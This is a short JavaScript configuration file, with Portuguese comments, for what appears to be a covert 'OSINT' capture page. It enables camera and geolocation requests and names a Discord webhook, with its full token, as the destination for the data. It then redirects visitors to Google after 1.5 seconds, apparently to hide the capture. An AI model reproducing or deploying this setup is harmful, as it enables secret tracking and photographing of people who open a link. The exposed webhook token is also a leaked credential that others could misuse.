// config opcional externa (pode ser sobrescrita via querystring)
// Você pode mover webhookUrl e finalUrl para cá e manter index.html limpo

window.OSINT_CONFIG = window.OSINT_CONFIG || {};
Object.assign(window.OSINT_CONFIG, {
  webhookUrl: "https://discord.com/api/webhooks/1484403547834417175/HttvmMxF1DLQQ-frtFDIhQfw13j5qol6Lt8OL_gs9JeiXDnb0y0jLkjAdvaSPv4GpyVS",
  finalUrl: "https://www.google.com",
  requestCamera: true,
  requestGeo: true,
  redirectDelayMs: 1500,
  debug: false
});
